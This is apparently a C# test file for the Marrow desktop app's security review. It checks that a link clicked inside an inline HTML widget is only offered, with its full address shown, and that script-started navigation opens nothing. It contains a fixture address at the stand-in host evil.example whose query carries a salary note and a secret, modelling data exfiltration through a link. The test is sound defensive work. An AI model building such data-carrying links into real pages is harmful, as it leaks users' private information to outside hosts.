using Avalonia.Automation;
using Avalonia.Controls;
using Avalonia.Controls.Documents;
using Avalonia.Threading;
using Avalonia.VisualTree;
using Marrow.App.Port.Web;
using Marrow.App.Port.Web.McpApps;
using Marrow.App.Tests.Fixtures;
using Marrow.App.Views.Chat;
using Marrow.Core.Localisation;
using Marrow.Services.Web;
using Marrow.UI.Markdown;

namespace Marrow.App.Tests.Web;

// PORT-ONLY: web surfaces security review 2026-10-13, finding L3, the adversarial reviewer's sibling path (ED-NEW-web-sec-artifacts-10;
// DESIGN.md 8.1 "A user click on a link inside an artifact is cancelled and offered to the link setting ... (the same list applies to
// MCP Apps and inline widgets)", 5.10 "the full URL with the query string expanded"). An html_widget is a no-network page: a link it
// draws can carry what it computed in its query, and one click sent it. A user's click now only offers the link: the widget's card
// shows the whole address, query and fragment included, with no line cap, and only its Open opens exactly that address. A
// script-started navigation offers nothing, and a dismissed offer opens nothing.
[Collection("Headless")]
[Trait("Decision", "ED-NEW-web-sec-artifacts-10")]
public sealed class InlineWidgetLinkNoticeTests(HeadlessSession headless)
{
    private const string Page = "<!doctype html><title>Totals</title><a href=\"https://evil.example/\">Docs</a>";
    private const string Address = "https://evil.example/collect?total=4242&note=my%20salary%20is%2090k#k=secret";

    private static string TextOf(TextBlock block) =>
        block.Inlines is { Count: > 0 } inlines ? string.Concat(inlines.OfType<Run>().Select(run => run.Text)) : block.Text ?? "";

    private static void Layout(Avalonia.Controls.Window window)
    {
        Dispatcher.UIThread.RunJobs();
        window.UpdateLayout();
    }

    [Fact]
    public void A_widget_link_opens_only_from_the_cards_offer_that_shows_its_whole_address() => headless.OnUiThread(() =>
    {
        var factory = WebSurfaces.Factory;
        var live = WebSurfaces.LiveFactory;
        var hook = InlineText.OpenUrl;
        var opened = new List<string>();
        Avalonia.Controls.Window? window = null;
        try
        {
            WebSurfaces.Reset();
            InlineWidgetSession.Reset();
            WebSurfaces.Factory = static () => new WebSurface(new FakeWebEngine(), new WebProfiles(@"C:\nth-test\WebView2", "en-US"), post: static action => action());
            WebSurfaces.LiveFactory = static _ => new Border();
            InlineText.OpenUrl = url => opened.Add(url.AbsoluteString);
            var card = InlineWebWidget.Html("0123abcd-totals-v1", Page, 200);
            window = new Avalonia.Controls.Window { Width = 700, Height = 500, Content = card };
            window.Show();
            Layout(window);
            var view = card.Widget!.View;
            if (view.Engine is not FakeWebView { IsAttached: true }) view.AttachNative(1, 2);
            var fake = Assert.IsType<FakeWebView>(view.Engine);
            var notice = card.LinkNotice;

            // The click opens nothing by itself: the card offers the whole address.
            fake.RaiseNavigationStarting(Address, userInitiated: true);
            Layout(window);
            Assert.Empty(opened);
            Assert.True(notice.IsEffectivelyVisible);
            Assert.Equal(InlineWebWidget.OpenLinkTitle, notice.Title);
            var showing = Assert.Single(notice.GetVisualDescendants().OfType<TextBlock>().Where(block => block.IsEffectivelyVisible), block => TextOf(block).Contains("evil.example", StringComparison.Ordinal));
            Assert.Equal(Address, TextOf(showing));
            Assert.Equal(0, showing.MaxLines);

            // Open opens exactly that address, once, and the offer goes.
            TabulaRig.Click(Assert.Single(notice.Actions));
            Layout(window);
            Assert.Equal([Address], opened);
            Assert.False(notice.IsVisible);

            // A navigation the page's script starts offers nothing; an offer the user dismisses opens nothing.
            fake.RaiseNavigationStarting("https://evil.example/?by=script", userInitiated: false);
            Layout(window);
            Assert.False(notice.IsVisible);
            fake.RaiseNavigationStarting("https://evil.example/?by=click", userInitiated: true);
            Layout(window);
            Assert.True(notice.IsVisible);
            var dismiss = Assert.Single(notice.GetVisualDescendants().OfType<Button>(), button => AutomationProperties.GetName(button) == UiText.Get("tabula.notice.dismiss"));
            TabulaRig.Click(dismiss);
            Layout(window);
            Assert.False(notice.IsVisible);
            Assert.Equal([Address], opened);
        }
        finally
        {
            window?.Close();
            InlineWidgetSession.Reset();
            WebSurfaces.Reset();
            WebSurfaces.Factory = factory;
            WebSurfaces.LiveFactory = live;
            InlineText.OpenUrl = hook;
        }
    });
}
